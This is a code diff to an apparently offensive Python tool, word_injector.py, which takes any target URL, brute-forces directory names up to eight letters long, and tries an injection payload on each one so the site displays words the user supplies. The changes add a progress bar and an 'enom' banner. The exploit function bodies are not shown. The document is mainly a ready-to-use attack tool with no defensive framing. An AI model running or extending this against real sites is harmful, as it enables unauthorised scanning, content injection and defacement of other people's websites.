@@ -1,9 +1,12 @@
-# File: word_injector.py
-
+import os
+import threading
 import requests
 import string
 import itertools
 from colorama import Fore, Style
+
+class bcolors:
+    OKCYAN = '\033[96m'
 
 def generate_combinations(min_length, max_length):
     for length in range(min_length, max_length + 1):
@@ -23,13 +26,29 @@ def inject_words(url, words):
     min_length = 1
     max_length = 8
 
+    total_combinations = sum(len(string.ascii_lowercase) ** i for i in range(min_length, max_length + 1))
+    completed_combinations = 0
+
+    def update_loading_bar():
+        while True:
+            progress = (completed_combinations / total_combinations) * 100
+            loading_bar = f"{Fore.BLUE}[*]{Style.RESET_ALL} Progress: [{Fore.BLUE}{'=' * int(progress // 2)}{Style.RESET_ALL}{' ' * (50 - int(progress // 2))}] {progress:.1f}%"
+            print(loading_bar, end='\r')
+            if completed_combinations >= total_combinations:
+                break
+
+    loading_thread = threading.Thread(target=update_loading_bar)
+    loading_thread.start()
+
     for combination in generate_combinations(min_length, max_length):
         directory = ''.join(combination)
         exploit_url = url + directory
-        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Trying {exploit_url}", end="\r")
         if try_exploit(exploit_url, payload):
-            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found vulnerable directory: {directory}")
             directories.append(directory)
+        completed_combinations += 1
+
+    loading_thread.join()
+    print()
 
     if directories:
         print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Discovered directories: {directories}")
@@ -52,7 +71,6 @@ def exploit_directory(base_url, directory, payload):
             subdirectory = ''.join(combination)
             subdirectory_url = exploit_url + '/' + subdirectory
             if try_exploit(subdirectory_url, payload):
-                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found vulnerable subdirectory: {subdirectory}")
                 subdirectories.append(subdirectory)
 
         if subdirectories:
@@ -61,6 +79,13 @@ def exploit_directory(base_url, directory, payload):
                 exploit_directory(exploit_url + '/', subdirectory, payload)
         else:
             print(f"{Fore.RED}[-]{Style.RESET_ALL} No exploitable subdirectories found.")
+
+os.system("clear")
+print()
+print(bcolors.OKCYAN + "┏┓┓ ┏┓┳┳┏┓┏┓")
+print(bcolors.OKCYAN + "┃┃┃ ┣┫┃┃┃┓┣ ")
+print(bcolors.OKCYAN + "┣┛┗┛┛┗┗┛┗┛┗┛")
+print("powered by enom")
 
 target_url = input("Enter the target URL: ")
 words = input("Enter the words you want the website to say: ")
